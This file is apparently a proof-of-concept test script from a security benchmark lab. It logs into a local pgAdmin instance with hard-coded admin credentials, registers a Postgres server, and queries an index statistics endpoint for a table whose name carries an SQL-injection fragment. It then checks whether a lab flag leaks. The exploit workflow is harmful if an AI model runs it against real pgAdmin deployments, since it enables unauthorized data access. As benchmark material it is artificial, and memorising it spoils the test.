import json, re, subprocess, urllib.request, urllib.parse, http.cookiejar

BASE = "http://127.0.0.1:33911"
FLAG = "PCBFLAG_ca10be62122e"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def req(path, method="GET", data=None, headers=None):
    h = {"User-Agent": "pcb-probe"}
    if headers: h.update(headers)
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
    r = urllib.request.Request(BASE + path, data=body, headers=h, method=method)
    try:
        resp = opener.open(r, timeout=30)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

# login
st, txt = req("/login")
m = re.search(r'"csrfToken": "([^"]+)"', txt)
csrf = m.group(1) if m else ""
m = re.search(r'"loginUrl": "([^"]+)"', txt)
login_url = m.group(1) if m else "/authenticate/login"
form = urllib.parse.urlencode({"email":"admin@pcb-lab.com","password":"Admin12345!","csrf_token":csrf,"language":"en"}).encode()
st, txt = req(login_url, "POST", form, {"Content-Type":"application/x-www-form-urlencoded"})
print("login status", st)
# post-login csrf
st, txt = req("/browser/js/utils.js")
m = re.search(r"pgAdmin\['csrf_token'\] = '([^']+)'", txt)
tok = m.group(1) if m else ""
print("csrf tok len", len(tok))
H = {"X-pgA-CSRFToken": tok, "Content-Type": "application/json"}

# server
st, txt = req("/browser/server/obj/1/")
sid = None
try:
    for node in (json.loads(txt).get("data") or []):
        if node.get("name") == "pg" and node.get("id"):
            sid = node["id"]
except Exception as e:
    print("server list parse err", e, txt[:200])
print("server list status", st, "sid", sid)
if sid is None:
    payload = {"name":"pg","host":"pg_v1","port":5432,"db":"postgres","username":"postgres","password":"pcbpass","ssl_mode":"prefer","maintenance_db":"postgres","save_password":True,"comment":""}
    st, txt = req("/browser/server/obj/1/", "POST", payload, H)
    print("server create status", st)
    sid = int(json.loads(txt)["node"]["_id"])
    st, txt = req(f"/browser/server/connect/1/{sid}/", "POST", {"password":"pcbpass"}, H)
    print("connect status", st, txt[:100])

st, txt = req(f"/browser/database/obj/1/{sid}/")
did = None
for node in (json.loads(txt) or []):
    if node.get("name") == "postgres": did = node["oid"]
print("did", did)

st, txt = req(f"/browser/schema/obj/1/{sid}/{did}/")
scid = None
for node in (json.loads(txt) or []):
    if node.get("name") == "public": scid = node["oid"]
print("scid", scid)

out = subprocess.run(["docker","exec","pcb-pga-v1-pg","psql","-U","postgres","-tAc","SELECT oid FROM pg_class WHERE relname LIKE 'x'' OR%'"], capture_output=True, text=True, timeout=30).stdout.strip()
tid = int(out.splitlines()[0]) if out.strip() else -1
print("tid", tid)

st, txt = req(f"/browser/index/stats/1/{sid}/{did}/{scid}/{tid}/")
print("stats status", st)
print("body[:1200]:", txt[:1200])
print("FLAG in body:", FLAG in txt)
